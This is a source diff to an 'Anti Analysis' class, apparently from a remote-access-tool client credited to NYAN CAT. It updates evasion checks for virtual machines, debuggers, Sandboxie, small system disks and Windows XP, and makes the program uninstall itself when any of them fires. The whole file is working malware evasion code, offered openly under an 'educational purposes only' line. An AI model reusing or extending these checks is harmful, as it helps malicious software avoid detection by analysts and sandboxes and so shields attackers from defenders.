@@ -1,12 +1,14 @@
-﻿using System;
+﻿using Client.Handle_Packet;
+using System;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Management;
 using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 
 //       │ Author     : NYAN CAT
-//       │ Name       : Anti Analysis v0.2
+//       │ Name       : Anti Analysis v0.2.1
 //       │ Contact    : https://github.com/NYAN-x-CAT
 
 //       This program is distributed for educational purposes only.
@@ -19,95 +21,56 @@ namespace Client.Helper
 
     class Anti_Analysis
     {
-        private static long GB_50 = 50000000000;
         public static void RunAntiAnalysis()
         {
-            if (DetectVirtualMachine() || DetectDebugger() || DetectSandboxie())
-                Environment.FailFast(null);
+            if (DetectVirtualMachine() || DetectDebugger() || DetectSandboxie() || IsSmallDisk() || IsXP())
+                //Environment.FailFast(null);
+                new HandleUninstall();
         }
 
-        internal static bool SmallHDD()
+        private static bool IsSmallDisk()
         {
-
-            // Method One - main drive smaller than 50gb, likely a VM
-            long driveSize = Methods.GetMainDriveSize();
-            if (driveSize <= GB_50 * 2)
-                return true;
-
-            // Method Two - has common card of virtual machine
-            //if (HasVMCard())
-                //return true;
-
-            // Method Three - checks for vm drivers
-            if (HasVBOXDriver())
-                return true;
-
-            // Method Four - if machine has been on for less than 5 mins
-            //if (GetUptime() < TimeSpan.FromMinutes(5))
-                //return true;
-
-            // Method Five - has VM mac address
-            if (HasVMMac())
-                return true;
-
+            try
+            {
+                long GB_60 = 61000000000;
+                if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= GB_60)
+                    return true;
+            }
+            catch { }
             return false;
         }
-        private static bool HasVMMac()
-        {
-            var macAddr =
-            (
-                from nic in NetworkInterface.GetAllNetworkInterfaces()
-                where nic.OperationalStatus == OperationalStatus.Up
-                select nic.GetPhysicalAddress().ToString()
-            ).FirstOrDefault();
 
-            var macs = new[]
+        private static bool IsXP()
+        {
+            if (new Microsoft.VisualBasic.Devices.ComputerInfo().OSFullName.ToLower().Contains("xp"))
             {
-                "00-05-69",
-                "00:05:69",
-                "000569",
-                "00-50-56",
-                "00:50:56",
-                "005056",
-                "00-0C-29",
-                "00:0C:29",
-                "000C29",
-                "00-1C-14",
-                "00:1C:14",
-                "001C14",
-                "08-00-27",
-                "08:00:27",
-                "080027",
-            };
-            foreach (string mac in macs)
-            {
-                if (mac == macAddr)
-                    return true;
+                return true;
             }
             return false;
         }
 
-
-
-
         private static bool DetectVirtualMachine()
         {
-            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+            try
             {
-                using (var items = searcher.Get())
+                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                 {
-                    foreach (var item in items)
+                    using (var items = searcher.Get())
                     {
-                        string manufacturer = item["Manufacturer"].ToString().ToLower();
-                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
-                            || manufacturer.Contains("vmware")
-                            || item["Model"].ToString() == "VirtualBox")
+                        foreach (var item in items)
                         {
-                            return true;
+                            string manufacturer = item["Manufacturer"].ToString().ToLower();
+                            if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
+                                || manufacturer.Contains("vmware")
+                                || item["Model"].ToString() == "VirtualBox")
+                            {
+                                return true;
+                            }
                         }
                     }
                 }
             }
+            catch { }
             return false;
         }
 
